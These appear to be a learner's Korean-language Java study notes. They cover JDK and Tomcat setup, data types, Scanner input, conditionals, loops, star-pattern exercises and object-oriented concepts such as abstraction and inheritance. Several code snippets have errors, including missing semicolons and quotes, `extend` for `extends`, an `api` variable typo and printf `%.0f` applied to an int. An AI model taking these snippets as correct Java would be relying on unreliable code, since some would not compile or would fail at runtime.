> 자바특징
1. 객제지향언어
2. 자동 메모리관리(GC)
3. 멀티 쓰레드를 지원(하나의 프로그램에서 동시에 여러작업)
4. 풍부한 라이브러리 지원
5. 운영체제에 독립적
특정운영체제에서만 실행가능한게 아니라 JVM(자바가상머산)때문에 가능하다.<br>
JVM = 자바 프로그램이 실행되는 가상컴퓨터
```
		     Java 애플리케이션 
        /         |        \
       /          |         \
	  /           |          \
-----------    ---------     ------------
jvm(window)    jvm(OSX용)     jvm(리눅스용)
-----------    ---------     ------------
os(window)     os(매킨토시)     os(리눅스)
-----------    ---------     ------------
하드웨어          하드웨어         하드웨어
-----------    ---------     ------------
따라서 jvm만 설치되있으면 된다.
```

```
자바설치 및 제거
cmd -> java -version -> appwiz.cpl(프로그램제거) -> java 2개 제거(update, kit)

자바 설치
구글 -> jdk8 -> win64 다운 -> 설치 -> C위치에 다운 ->  jdk 먼저 다운 받고 -> jre를 다운받는다(자바코드실행하기위한)
->cmd -> java -version

환경변수 세팅
cmd -> sysdm.cpl -> 위에 고급 -> 환경변수 -> 시스템변수(전체계정이 설정되는)에서
1. JAVA_HOME
-> C->programfiles -> java -> jdk 폴더 들어가기 -> 파일탐색기 주소 복사
편집 -> %JAVA_HOME%bin 삭제 -> 새로 만들기 -> 변수이름 : JAVA_HOME , 변수값 : C:\Program Files\Java\jdk1.8.0_291
-> 확인
2. Path
또 시스템변수에 가서 -> Path 편집 -> %JAVA_HOME%\bin

cmd -> javac -version으로 확인

파일탐색기 주소창에 -> %JAVA_HOME%하면 설치경로로 이동된다.
------------------------------------------------------------
이클립스 설치
구글 -> eclipse -> downloadpackages -> MORE DOWNLOADS 9월부터 자바8버전이 인식xx 그래서 3월로 다운받는다
-> EE설치 

톰캣설치 -> 8버전(core.zip) -> 압축풀기 -> bin은 톰캣에 관련된 명령어 들어가있다. -> 
start.bat 더블클릭 실행 -> 서버가 돌아간다 -> localhost:8080치면 톰캣이 돌아가고 있기때문에 가능하다. 윈도우는 startup.bat이고
리눅스는 start.sh라서 실제로 systemctl start tomcat과 같다고 생각하면 된다.

시스템변수
1.Path하나더 추가 -> CATALIA_HOME ->  E:\평일7월JSP_조성동\apache-tomcat-8.5.68 (bin에는 들어가지말고)
2.Path 편집 -> 추가 %CATALINA_HOME%\bin

cmd새로 열어서 -> %CATALINA_HOME% 입력 -> 톰캣홈디렉토리 나온다. -> startup치면 서버구동된다. -> localhost:8080 검색
```
javac.exe는 자바 컴파일러로 javac hello.java 를 하면 hello.class 로 변환해준다<br>
java.exe(클래스파일실행) hello.class 파일을 실행할 수있다.<br>

---

```
build란 소스파일(.java)로 부터 프로그램을 만들어 내는 과정
멀티컬럼모드 -> alt + shift + a + 화살표

//자료형 (=Data Type) : 코드 내에서 데이터를 식별하는 기준
		// 1. 기본 자료형
		// boolean	1bit     참/거짓
		// byte     1byte	 정수
		// char     2byte	 문자
		// short	2byte    정수
		// int 	    4byte	 정수
		// long     8byte    정수
		// float    4byte    실수
		// double   8byte    실수
		
		// 2. 참조 자료형
		// 기본 자료형을 제외한 모두
		// 클래스로 만들어진 자료형을 의미한다.
		// 참조 자료형은 데이터를 직접 저장하지 않고, 다른 위치에 생성된 공간을 가리키는 자료형

//배열도 참조 자료형에 해당한다.
		int[] arr = new int[] {10,20,30,40,50};  //arr이 저기 있는 요소들을 가리킨다. (new가 힙에서 만들어진다)
        System.out.println("arr = "+arr); //참조변수는 출력시, 해시코드라는 이상한 값이 출력된다.
		System.out.println("arr[0]= "+arr[0]);
```
```
1은 참은 맞지만 자바는 아니다. 자바는 true, false만
boolean bo1 = true;
boolean bo3 = 10 > 5;  // true
boolean bo2 = false;

//형변환은 반올림 생각하지 않는다.  .2f이런거는 가능
//그래서, 3.141592에서
//double result = Math.round(pi); // 3.0으로 출력(소수점위치에서 반올림)
//double result = Math.round(pi*100) / 100.0; //3.14로 출력
					314.1592   / 100. 0 이니까
```

```
public class ex02 {
	public static void main(String args[]) {
		//Scanner라는 데이터를 읽는 도구를 사용해서 입력을 좀 더 수월하게 처리가능(통로에서 쓱 스캔)
		//그래서 scanner는 system.in과 같이쓴다.
		
		//System : 표준 입출력 클래스
		//System안에는 in이 있고  -> 표준 입력 스트림(한글자씩 통로를 통해 전달) 그래서 한번에 주는 scanner이용
		//System안에는 out이 있고 -> 표준 출력 스트림
		//System안에는 err가 있다. -> 표준 에러출력 스트림
		//Scanner도 자료형인데 참조자료형이다(기본자료형을 제외한 모든 자료형은 참조자료형이다)
		//즉, Scanner는 직접 공간을 가지고 있지 않다. 그래서 new로 공간을 만든다.
		//import해줘야된다.
		Scanner sc;  //Scanner앞에 커서두고 ctrl+space하면 import구문 알아서 들어간다.
		sc = new Scanner(System.in);  //Scanner가 스트림을 스캔을 뜬다.(sc라는 변수가 전달)
		                              //그 후 이 스트림(통로)를 닫아줘야한다.(보안상)
		int n;
		System.out.print("정수입력: ");
		n = sc.nextInt();  //sc.next자료형();
		System.out.println("n= "+n);
		
		sc.close();  //요즘에는 안닫아도 된다.(습관들이기 닫도록)
	}
}
```
```
public class ex03 {

	public static void main(String[] args) {
		Scanner sc = new Scanner(System.in);
		int it;
		String str;
		double db;
		
		//위의 세변수에 입력을 받도록
		System.out.print("1.정수입력: ");
		it = sc.nextInt();
		System.out.println("it = "+it+"\n");
		
		System.out.print("2.실수입력: ");
		db = sc.nextDouble();
		System.out.println("db = "+db+"\n");
		
		System.out.print("3.문자열 입력: ");
		str = sc.next();  //문자열은 그냥 next
		System.out.println("str = "+str+"\n");
		
		sc.close(); //Scanner는 중간에 닫으면 다시 열수 없기 때문에 마지막에 닫자!!
		

	}
}
```

```
public class ex04 {
    public static void main(String[] args) {
        //boolean,정수,실수는 next자료형() 형식으로 받을 수 있다
        //또한 문자열과, 문자는 조금다르다
        String test = "apple" //인텍스가 01234 이렇다.
        System.out.println("test.charAt(1)) //p (이렇게 짜를수도 있구나~)

        Scanner sc = new Scanner(System.in);
		String str;
		char ch;
		
		System.out.print("문자열 입력: ");
		str = sc.next();
		System.out.println("str = "+str);
		
		//문자입력 시
		System.out.print("문자 입력: ");
		ch = sc.next().charAt(0);  //문자는 0만쓰면된다.
		System.out.println("ch = "+ch);
		
		sc.close();
    }
}
```
```
public class ex06 {

	public static void main(String[] args) {
		//nextLine() : 한 줄 전체를 입력 받는 구문, 버퍼를 비우는 용도로 사용되기도 한다.
		Scanner sc = new Scanner(System.in);
		
		String lang;
		int number;
		String program;
		System.out.print("공부중인 언어: ");
		lang = sc.next(); //공백 이후 부터는 출력안된다. 
		System.out.println("lang = "+lang); //자바 입니다~ 라고 입력하면 "자바"만 들어간다.
		                                    //즉, 버퍼에 입니다~ 가 남아있다.
		// 그래서 lang = sc.nextLine(); 이렇게 쓴다.
		
		//nextInt(); 는 \n을 안가져온다. 
		
		System.out.print("수업회차?");
		number = sc.nextInt();
		System.out.println(number + "일차~\n");
		
		sc.nextLine();  // nextInt()에서 \n을 가져오면 안되기 때문에 버퍼지우기
		
		System.out.print("사용중인 개발 도구는?");
		program = sc.nextLine();
		
		System.out.println(program + "을 사용중");
		
		sc.close();
	}
}
```
```
public class Ex02 {

	public static void main(String[] args) {
		Scanner sc = new Scanner(System.in);
		
		String lang;
		int number;
		String program;
		String base;
		System.out.print("공부중인 언어: ");
		//입력: c 언어
		//출력: lang = c
		       program = 언어(\n) -> 즉, next는 자료형은 \n을 읽지않는다. 그래서 base에서는 안읽는다. 
		//띄어쓰기를 기준->next
		lang = sc.next();
		program = sc.next(); 
		//base = sc.next();
		System.out.println("lang = " + lang); 
		System.out.println("program = " + program);
		//System.out.println("base = " + base);
	}
}
```
```
public class quiz02 {

	public static void main(String[] args) {
		
		Scanner sc = new Scanner(System.in);
		String name;
		String address;
		double height;
		String phone;
		int age;
		
		System.out.print("이름을 입력: ");
		name = sc.next();  //\n을 던지지만 next자료형은 읽지않음. nextLine은 읽기때문에 버퍼로 지워야함
		System.out.print("나이 입력: ");
		age = sc.nextInt();
		System.out.print("신장 입력: ");
		height = sc.nextDouble();
		sc.nextLine(); // \n 을 버린다
		System.out.print("주소 입력: ");
		address = sc.nextLine();
		System.out.print("연락처: ");
		phone=sc.next();
		
		System.out.printf("이름: %s(%d)세\n", name,age);
		System.out.printf("신장: %.1fcm\n", height);
		System.out.println("주소: "+address);
		System.out.printf("연락처: %s", phone);
	}

}

```
```
public class ex03 {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        int n1, n2;
        n1 = sc.nextInt();
        n2 = sc.nextInt();

        String result = n1 > n2 ? "n1이 큰값" : "n2가 큰값";
    }
}
```
```
문) 입력 받은 수가 3의 배수인지 판별
package operator;

import java.util.Scanner;

public class quiz01 {

	public static void main(String[] args) {
		Scanner sc = new Scanner(System.in);
		int input;
		
		System.out.print("자연수 입력: ");
		input = sc.nextInt();
		
		System.out.println(input % 3 == 0 ? "3의 배수입니다" : "3의 배수가 아닙니다");
		//또는 result = (input % 3 == 0) ? n + "은 3의 배수입니다" : ~
	}
}
```
```
문) 두수를 입력받아 큰수를 출력
public class quiz02 {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        int input1, input2;
        System.out.println("두 수를 입력하세여: ");
        input1 = sc.nextInt();
        input2 = sc.nextInt();

		//입력시에 3 5 이렇게해도되고
		//3
		//5 이렇게 줄바꿈해서 해도된다.


        int result = input1 > input2 ? input1 : input2;
		System.out.println(result);
    }
}
```
```
//12345678900 같은 범위는 뒤에 L이나 l 붙여야한다.
//byte는 127부터 -128까지 근데 byte bnum = 128; 이렇게 하면 에러난다.

//long lnum = 1234;  -> 4byte가 8byte에 들어간다.

//float fnum = 3.14; 이렇게 쓰면 에러가난다.(실수형에 접미사가 없으면 3.14d 라고생각 d가 생략, 그래서 아래처럼 f를 붙여야한다.)
//float fnum = 3.14f; 실수는 기본적으로 double(8byte)에 저장이된다. 그래서 float에 저장할려니 에러 그래서 f붙임
//long = 100000000000L; int형의 범위를 벗어나면 L붙여야됨
//10f -> 10.0f
//1e3 -> e는 10의n제곱을의미 -> 1000.0(e는 실수형 접미사)
```
```
public class ex02 {

	public static void main(String[] args) {
		Scanner sc = new Scanner(System.in);
		int age;
		
		System.out.print("나이 입력: ");
		age = sc.nextInt();
		
		if (age>=20) {  //if문은 피라미드구조로 해야된다. 범위가 젤 많은게 밑으로
			System.out.print("성인");
		}
		else if(age >= 17) {
			System.out.print("고등학생");
		}
		else if (age >= 14) {
			System.out.print("중학생");
		}
		else {
			System.out.print("초등학생 이하");
		}
		System.out.println("입니다~");
		sc.close();    
	}

}
```
```
문)세 정수 최대값
public class quiz05 {

	public static void main(String[] args) {
		Scanner sc = new Scanner(System.in);
		int num1,num2,num3;
		int max;
		System.out.print("세 정수를 입력: ");
		num1 = sc.nextInt();
		num2 = sc.nextInt();
		num3 = sc.nextInt();
		
		max = num1;
		if(max < num2) {
			max = num2;
		}
		if(max <num3) {
			max = num3;
		}
		System.out.println("최대값: "+max);
	}
}

```
```
문) 자바는 강제 형변환없이 double -> int 대입불가능
    복합대입연산자는 알아서 처리해준다는 특징이 있다.

public class quiz06 {

	public static void main(String[] args) {
		Scanner sc = new Scanner(System.in);
		int usb;
		int gab;
		int total;
		System.out.print("usb 구매 갯수: ");
		usb = sc.nextInt();
		gab = usb * 5000;
		
		if (usb >= 100) {
			total = gab *= 0.88;  // gab * 0.88(더블) 은 안된다.자료형때문에 그래서 복합대입쓴다.
			System.out.printf("가격: %.0f원",total);
		}
		else if (usb >= 10) {
			total = (int)(gab*0.9);
			System.out.printf("가격: %.0f원",total);
		}
		else if (usb > 0) {
			System.out.println("가격: "+gab+"원");
		}
		else {
			System.out.println("잘못입력하셨습니다");
		}

	}
```
```
public class quiz07 {

	public static void main(String[] args) {
		Scanner sc = new Scanner(System.in);
		int station;
		int total;
		
		System.out.print("정거장 수?");
		station=sc.nextInt();
		
		if(station < 10) {
			total = station * 2; //2분씩
			System.out.println("총 소요시간: "+total+"분");
		}
		else {
			total = station * 4; //4분씩
			if (total >=60) {
				int hour=total/60;
				int min=total % 60;
				System.out.println("총 소요시간: " +hour + "시간"+min+"분");
			}
			else {
				System.out.println("총 소요시간: "+total+"분");
			}
		}
		sc.close();
	}

```
```
package _switch;   //switch(값) 값에 가능한 데이터는 정수와 문자열만 가능

import java.util.Scanner;

public class ex01 {
	public static void main(String[] args) {
		
		//switch 로 만들어진 것은 if로 만들수있지만 반대는 제약이있다.
		Scanner sc = new Scanner(System.in);
		int menu;
		System.out.print("메뉴 입력(1~3): ");
		menu = sc.nextInt();
		
		switch(menu) {  //break를 넣어야한다. 안넣고 1치면 1,2,3 메뉴 다 출력된다.
		case 1:
			System.out.println("1번 메뉴 선택~");
			break;
		case 2:
			System.out.println("2번 메뉴 선택");
			break;
		case 3:
			System.out.println("3번 메뉴 선택");
			break;
		}
		
	}
}
============================================================================
switch(menu) {
		case 1:
			System.out.println("1번 메뉴 선택~");  //이렇게 break가 없으면 1입력후 -> 1,2 출력 후 break만나서 그만 
		case 2:
			System.out.println("2번 메뉴 선택");
			break;
		case 3:
			System.out.println("3번 메뉴 선택");
			break;
		default:  //default는 가장 밑에 쓸꺼면 break 필요없다.
			System.out.println("없는 메뉴");
		}

```
```
public class ex02 {

	public static void main(String[] args) {
		//switch 문은 특정 값 하나에 대해서 처리하는데 특화
		//즉, 범위 조건 처리가 힘들다.(1~5까지는 여기타고 이런게)
		
		Scanner sc = new Scanner(System.in);
		int num;
		
		System.out.print("정수 입력(1~10): ");
		num = sc.nextInt();
		
		switch(num) {   // 5를 입력하면 5로 점프 후 break까지 
		case 1: case 3: case 5: case 7: case 9:
			System.out.println("홀수");
			break;
		case 2:
		case 4:
		case 6:
		case 8:
		case 10:
			System.out.println("짝수");
			break;
		}
	sc.close();
}
```
```
public class ex03 {

	public static void main(String[] args) {
		Scanner sc = new Scanner(System.in);
		String menu;
		
		System.out.println("\t1. 짜장면");
		System.out.println("\t2. 짬뽕");
		System.out.println("\t3. 볶음밥");
		System.out.println("\t4. 탕수육");
		
		System.out.print("\n>>> ");
		menu = sc.next();
		
		switch(menu) {
		case "짜장면" : case "1": 
			System.out.println("짜장면 주문");
			break;
		case "짬뽕" :
			System.out.println("짬뽕 주문");
			break;
		case "볶음밥" :
			System.out.println("볶음밥 주문");
			break;
		case "탕수육" :
			System.out.println("탕수육 주문");
			break;
		default :
			System.out.println("없는 메뉴입니다");
		}
		sc.close();
	}
}
```
```
public class ex01 {
	public static void main(String[] args) {
		// 1. while(조건식) 조건식이 참이면 실행
		
		int i = 1;
		while (i<=5) { // i가 5이하 일때까지 반복
			System.out.println(i+": Hello World!!!");
			i++;
		}  //반복종료 후 i는 6이다!!!!
	}
}
```
```
#) 0입력시 종료
package loof;

import java.util.Scanner;

public class ex02 {

	public static void main(String[] args) {
		//while의  주목적 불특정 반복
		
		Scanner sc = new Scanner(System.in);
		int n=1;
		
		while(n != 0) {
			System.out.print("정수 입력(0:종료): ");
			n = sc.nextInt();
			
			System.out.println("n = " +n+"\n");
		}
		sc.close();
	}
}
```
```
public class ex04 {

	public static void main(String[] args) {
		Scanner sc = new Scanner(System.in);
		int n2;
		
		do {  //파이썬은 do~while문이 없다.
			System.out.print("정수 입력(0입력시 종료): ");
			n2 = sc.nextInt();
			System.out.println("n2 = "+n2+"\n");
		}while(n2 != 0);
		sc.close();
	}
}
```
```
문) 거꾸로 수 출력
int n;
while(n!=0){ // 몫이 0이면 종료
	System.out.print(n%10);
	n /= 10;
}
```
```
public class ex06 {
	public static void main(String[] args) {
		//for문 : 특정횟수, 배열의 반복에 특화
		for (int i =1; i<=5; i++) {
			System.out.print(i+" ");
		} //i는 for문에서 만들어진 지역변수다. 그래서 밖에서 i출력하면 안나온다. 
	}
}
```
```
public class quiz01 {

	public static void main(String[] args) {
		Scanner sc = new Scanner(System.in);
		int n, fac =1;
		System.out.print("팩토리얼: ");
		n = sc.nextInt();
		for(int i =1; i<=n; i++) {
			fac *= i;
		}
		System.out.println(n+"!="+fac);
		sc.close();
	}
}
```
```
****
 ***
  **
   *
package basic;

import java.util.Scanner;

public class Ex02 {

	public static void main(String[] args) {
		for(int i = 0; i < 4; i++) {
			for(int k = 0; k < i; k++) {
				System.out.print(" ");
			}
			for(int j = 4-i; j > 0; j--) {
				System.out.print("*");
			}
		System.out.println();
		}	
	}
}
```
```
*   * (i=0, j=0 j=4)일때
 * *  (i=1, j=1 j=3)일때
  *   (i=2, j=3)
 * *  (i=3, j=1  j=3)일때
*   * (i=4, j=0  j=4)일때
for(int i = 0; i<5; i++) {
			for(int j=0; j<5; j++) {
				if(i==j || i+j == 4)
					System.out.print("*");
				else
					System.out.print(" ");
			}	
			System.out.println();
		}
```
```
***** (i=0, j=0,1,2,3,4)
   *  (i=1, j=3)
  *   (i=2, j=2)
 *    (i=3, j=1)
***** (i=4, j=0,1,2,3,4)
for(int i = 0; i<5; i++) {
			for(int j=0; j<5; j++) {
				if(i==0 || i+j == 4 || i==4)
					System.out.print("*");
				else
					System.out.print(" ");
			}	
			System.out.println();
}
```
```
	*	  (i=0, j=4)
   * *    (i=1, j=3 j=5)
  *****   (i=2, j=2,3,4,5,6)
 *     *  (i=3, j=1 j=7)
*       * (i=4, j=0 j=8)
for(int i = 0; i<5; i++) {
			for(int j=0; j<4-i; j++) {
					System.out.print(" "); //0,1,2,3까지 공백찍고 (앞에는공백 미리 다찍고)
			}
			for(int j=0; j<=i*2; j++) { //4에 별찍고(여기서는 0)
				if (j==0 || j==i*2 || i ==2){ //i가 2이면 다찍고 즉, 중앙에는 다 찍고
					System.out.print("*");
				}
				else
					System.out.print(" ");
				}
			System.out.println();
	}
```
```
public class 개 {
	void 먹기() {
		System.out.println("개 같이 먹는다");
	}
	void 소리내기() {
		System.out.println("개 소리 낸다");
	}
	void 움직이기() {
		System.out.println("개 같이 움직인다");
	}
	void 개만가지는기능() {
		System.out.println("개 기능");
	}
}
---------------
public class 고양이 {
	void 먹기() {
		System.out.println("고양이 같이 먹는다");
	}
	void 소리내기() {
		System.out.println("고양이 소리 낸다");
	}
	void 움직이기() {
		System.out.println("고양이 같이 움직인다");
	}
	void 고양이만가지는기능() {
		System.out.println("고양이 기능");
	}
}
-----------------
public class Main {
	개 dog = new 개();
	dog.움직이기();
	...
	
	고양이 cat = new 고양이();
	cat.움직이기();
	...
	
	//이렇게하면 class에서도 공통적으로 들어가는 게 많아서 비효율적 -> 추상화로 
}
```
```
//우리가 동물 그 자체가 먹는 소리, 움직이는거 소리내는거(공통적인부분들) 명확하게 정의 할 수가 없다. -> 상속받은 애들이 알아서구현해라 
public class Main {
	개 dog = new 개();
	dog.움직이기();
	...
	
	고양이 cat = new 고양이();
	cat.움직이기();
	...
	
	//다형성이용
	동물[] ani = new 동물[] { dog, cat}; //부모로 업캐스팅
	for(int i = 0; i<ani.length; i++) {
		ani[i].먹기();
		ani[i].소리내기();
		ani[i].움직이기();
		//개만가지는기능, 고양이만 가지는 기능은 쓸수없다.->다운캐스팅
		if(ani[i] instanceof 개) { //그래서 이렇게 해야한다.
			개 tmp = (개)api[i];
			tmp.개만가지는기능();
		}
	}
}
----------------
public class 개 extends 동물{
	@Override
	void 먹기() {
		System.out.println("개 같이 먹는다");
	}
	@Override
	void 소리내기() {
		System.out.println("개 소리 낸다");
	}
	@Override
	void 움직이기() {
		System.out.println("개 같이 움직인다");
	}
	void 개만가지는기능() {
		System.out.println("개 기능");
	}
}
---------------
public class 고양이 extends 동물{
	@Override
	void 먹기() {
		System.out.println("고양이 같이 먹는다");
	}
	@Override
	void 소리내기() {
		System.out.println("고양이 소리 낸다");
	}
	@Override
	void 움직이기() {
		System.out.println("고양이 같이 움직인다");
	}
	void 고양이만가지는기능() {
		System.out.println("고양이 기능");
	}
}
------------------
public class 동물 {
	void 먹기() {}
	void 소리내기() {
	void 움직이기() {}
}
```
```
public class Main {
	개 ob1 = new 개();
	고양이 ob2 = new 고양이();
	고래 ob3 = new 고래();
	상어 ob4 = new 상어();
	펭귄 ob5 = new 펭귄();
	독수리 ob6 = new 독수리();
	
	포유류[] 포 = new 포유류[] {ob1,ob2,ob3};
	어류 어 = ob4;
	조류[] 조 = new 조류[] {ob5,ob6};
	
	//다형성이용(동물에는 다 속하니까)
	동물[] ani = new 동물[] { ob1, ob2,ob3,ob4,ob5,ob6};
	//또는
	동물[] ani2 = new 동물[] {포[0], 포[1], 포[2], 어, 조[0], 조[1]};
	
	for(int i = 0; i<ani.length; i++) {
		ani[i].먹기(); //자식요소쓸려면 다운캐스팅
		ani[i].소리내기();
		ani[i].움직이기();
		//개만가지는기능, 고양이만 가지는 기능은 쓸수없다.->다운캐스팅
		if(ani[i] instanceof 개) {
			개 tmp = (개)api[i];
			tmp.개만가지는기능();
		}
	}
}
----------------
public class 개 extends 포유류{ //동물 + 포유류의 추상메서드를 구현해야한다. 만약에 포유류에서 추상메서드가 정의되있으면 @Override안해도된다.
	@Override
	void 먹기() {
		System.out.println("개 같이 먹는다");
	}
	@Override
	void 소리내기() {
		System.out.println("개 소리 낸다");
	}
	@Override
	void 움직이기() {
		System.out.println("개 같이 움직인다");
	}
	void 개만가지는기능() {
		System.out.println("개 기능");
	}
	//이렇게 해도되고 아니면 포유류 class에서 포유류특징 메서드를 정의하면 된다.
	@Override
	void 포유류특징() {
		
	}
}
--------------
public class 고양이 extends 포유류{
	@Override
	void 먹기() {
		System.out.println("고양이 같이 먹는다");
	}
	@Override
	void 소리내기() {
		System.out.println("고양이 소리 낸다");
	}
	@Override
	void 움직이기() {
		System.out.println("고양이 같이 움직인다");
	}
	void 고양이만가지는기능() {
		System.out.println("고양이 기능");
	}
}
-------------
public class 고래 extends 포유류{
	@Override
	void 먹기() {
		System.out.println("고래 같이 먹는다");
	}
	@Override
	void 소리내기() {
		System.out.println("고래 소리 낸다");
	}
	@Override
	void 움직이기() {
		System.out.println("고래 같이 움직인다");
	}
	void 고래만가지는기능() {
		System.out.println("고래 기능");
	}
}
----------------
public class 독수리 extends 조류{
	@Override
	void 먹기() {
		System.out.println("독수리 같이 먹는다");
	}
	@Override
	void 소리내기() {
		System.out.println("독수리 소리 낸다");
	}
	@Override
	void 움직이기() {
		System.out.println("독수리 같이 움직인다");
	}
	void 독수리만가지는기능() {
		System.out.println("독수리 기능");
	}
}
---------------------
public class 상어 extends 어류{
	@Override
	void 먹기() {
		System.out.println("상어 같이 먹는다");
	}
	@Override
	void 소리내기() {
		System.out.println("상어 소리 낸다");
	}
	@Override
	void 움직이기() {
		System.out.println("상어 같이 움직인다");
	}
	void 상어만가지는기능() {
		System.out.println("상어 기능");
	}
}
-------------------------
public class 펭귄 extends 조류 implements 물생활{
	@Override
	void 먹기() {
		System.out.println("펭귄 같이 먹는다");
	}
	@Override
	void 소리내기() {
		System.out.println("펭귄 소리 낸다");
	}
	@Override
	void 움직이기() {
		System.out.println("펭귄 같이 움직인다");
	}
	void 펭귄만가지는기능() {
		System.out.println("펭귄 기능");
	}
	public void 물에서동작() {
		System.out.println("펭귄이 물에서 생활");
	}
}
----------------------------
public abstract class 조류 extends 동물{ 
	void 조류특징() {
		System.out.println("날개짓을 한다.");
	}
}
----------------------------
public abstract class 포유류 extends 동물{
	abstract void 포유류특징();
	//void 포유류특징() {  //이렇게하면 Override안해도된다.
	//	System.out.println("새끼를 낳는다");
	//}
}
------------------------------
public abstract class 어류 extends 동물{
	void 어류특징() {
		System.out.println("물에서 산다");
	}
}
//하지만 동물자체는 객체를 생성하면 안된다. 동물이라는 객체는 세상에 없다. 동물의 특성을 가지는 애들이 있을뿐이지.(개,고양이 등)
public abstract class 동물 {
	abstract void 먹기(); //동물이 어떻게 먹는지 모르기때문에 추상메서드
	abstract void 소리내기();
	abstract void 움직이기();
}
------------------
또 보니까 물생활은 따로 묶어도되겠네? -> interface로 제공 
public interface 물생활 {
	public abstract void 물에서동작();
}

그러면 main에서
//서로관련은 없지만 묶을 수 있다.
물생활[] 물 = new 물생활[] {
	ob3,ob4,ob5
};
for(int i = 0; i<물.length; i++) {
	물[i].물에서동작();
}
```
```
객체지향프로그래밍의 반대 개념으로는, 절차적프로그래밍이 있다.
즉, 함수를 이용해서 정리정돈하는 프로그래밍 기법이다. C언어

즉, 함수를 이용해서 작은 부픔을 만들고 이것을 결합해서 더큰 프로그램을 만들어가는 것

하지만 복잡한 어플리케이션을 위해서는 실제세계처럼 더 밀접한 모델링 방식이 필요했다.

그래서 서로연관된함수, 변수를 모아서 정리정돈한게 class이다.
이런 클래스 중심으로 프로그램의 구조를 만들어가는 프로그래밍 방법론이 객체지향프로그래밍이다.

```
```
#)추상화
- 보통알고는 있지만 정확하게 표현하기 힘든것들을 중요한부분이나 특징점을 잡아 설명하는 것을
"추상적으로 표현한다, 추상화한다" 라고 말하는것이다.

- 객체지향프로그래밍의 추상화는 크게 두가지로 나뉘는데
1. 객체의 관련 속멍만 표시 - 데이터 추상화
2. 불필요한 세부정보는 숨긴다 - 제어 추상화
```
```
#)제어추상화
- 어떤 클래스의 메소드를 사용하는 사용자에게 해당 메소드의 작동방식과 같은 내부로직을 숨기는 것이다

예를들어 소비자가 자동차를 운전할 때 시동,정지 이러한 동작만 쓸수있으면 되지,
실제 거기에 대한 프로세스를 알필요가 없다.

핵심은 보다 프로그래밍을 빠르게 설계하고 구현하기 위해 추상화를 사용하는 것이다.

실제 자바에서 달력 클래스를 보면
CountryCalendar.getInstance("countryName") 이렇게쓰는데

사용자는 getInstance 메서드가 내부에서 어떤로직으로 각 나라의 달력을 구분해 계산하는지
알필요가 없이 결과값만 얻으면 된다.

즉, 메서드만 쓰면 되는것이라는 것이다.
즉, 구체적이지 않고 추상적으로 메서드 동작을 가늠해 결과값만 받고 끝낸다라는 뜻
실제 우리가 많이 쓰는 for, while 도 제어추상화한것이라 볼수있다.
```
```
#)데이터 추상화
대상을 간단한 개념으로 일반화하는 과정

삼각형,사각형,원이라는 객체가 있을때, 이 객체들을 하나로 묶을 때 객체들의 공통특징인
도형으로 묶어 이름을 붙이는 것을 데이터 추상화라고 보면된다.

이처럼 추상화를 하면 할 수록 객체의 디테일함이 사라지고 공통된 특징만 남게된다.

예를들어 아이폰 객체를 추상화를 통해 객체정보를 분리할 때
아이폰 -> 휴대폰 -> 통신기기 -> 전자제품으로 추상화가 이어질수있다.


abstract class 전자제품 {
}

abstract class 통신기기 {
}

abstract class 휴대폰 {
}

class 아이폰 {
}


그리고 이렇게 추상화한 상위요소부터 각 요소에 맞는 기능들을 정의한다.
전자제품은 전원기능을, 통신기기는 통화기능, 휴대폰은 카메라,게임기능, 아이폰은 애플앱을
이용 할 수 있는 연동기능을 요소마다 속성을 배치한다.

그리고 마지막으로 상위요소가 가진 내용들을 가질 수 있도록 상속관계를 설정하여 이어준다.

이렇게 공통된 기능들은 상위요소에서 미리 구현하기 때문에 아이폰을 만들 때 아이폰만의 고유기능
위주로 개발할 수 있게된다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/1.PNG" width="650" height="300" /><br><br>
```
abstract class 전자제품 { //전자제품은 구체적인 객체가아니라 추상화이다. 그래서 abstract를 씀
    전원기능();
}

abstract class 통신기기 extends 전자제품 {
    통화기능();
}

abstract class 휴대폰 extends 통신기기 {
    카메라기능();
    게임기능();
}

class 아이폰 extends 휴대폰 {
    전원기능() { ... }
    통화기능() { ... }
    카메라기능() { ... }
    게임기능() { ... }
    애플 제품 연동기능() { ... }
}
// → 최종적으로 아이폰 class는 전원, 통화, 카메라, 게임, 애플 연동 5가지 기능을 정의하여 설계된다
```
```
아이폰 제품하나만 만들때는 비효율적으로 보일수있지만 제품종류가 늘어날 수록 장점으로 작용된다.

공통 기능을 미리 개발해두면, 기능 상속을 통해 빠르게 구조를 확장 할 수 있기 때문이다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/2.PNG" width="650" height="300" /><br><br>

```
#)상속
- 위의 아이폰 예시에서 추상개념(abstract)들을 서로이었는데(extends) 이것이 바로 상속이다.

즉, 그대로 물려받는것이다.
// super 클래스
class Parent {
    String name;
    String age;
    
    public void say() {
    	System.out.println(name + age);
    }
    
}

// sub 클래스 (상속 받음)
class Child extend Parent{
	String hair;
    
    public void myHair() {
    	System.out.println(hair);
    }
    
}

// 상속받은 자식클래스는 부모클래스의 속성들을 이용이 가능하다.
Child c = new Child();
c.name = "풍성한"; //부모요소에 접근
c.age = 17; //부모요소에 접근
c.say(); //부모요소에 접근
c.hair = "M자형.."
c.myHair();
```
```
상속기능을 이용하게 되면, 상위클래스의 특징을 하위클래스에서 상속받아 코드의 중복제거,코드재사용
효과도 있다.

//아래는 상속을 쓰지않았을 때다.
class Dog {
    int teethCount; // 중복된 속성들
    int legCount; // 중복된 속성들
    int tailCount; // 중복된 속성들
    void bark();
}

class Cat {
    int teethCount; // 중복된 속성들
    int legCount; // 중복된 속성들
    int tailCount; // 중복된 속성들
    void meow();
}

class Lion {
    int teethCount; // 중복된 속성들
    int legCount; // 중복된 속성들
    int tailCount; // 중복된 속성들
    void roar();
}
```
```
//상속을 통한 코드절약
class Animal {
    int teethCount; 
    int legCount; 
    int tailCount; 
}

class Dog extends Animal { // 상속을 통해 중복 코드를 제거
	//별도구현메서드
    void bark();
}

class Cat extends Animal { // 상속을 통해 중복 코드를 제거
    //별도구현메서드
	void meow();
}

class Lion extends Animal { // 상속을 통해 중복 코드를 제거
    //별도구현메서드
	void roar();
}
```
```
#)다형성
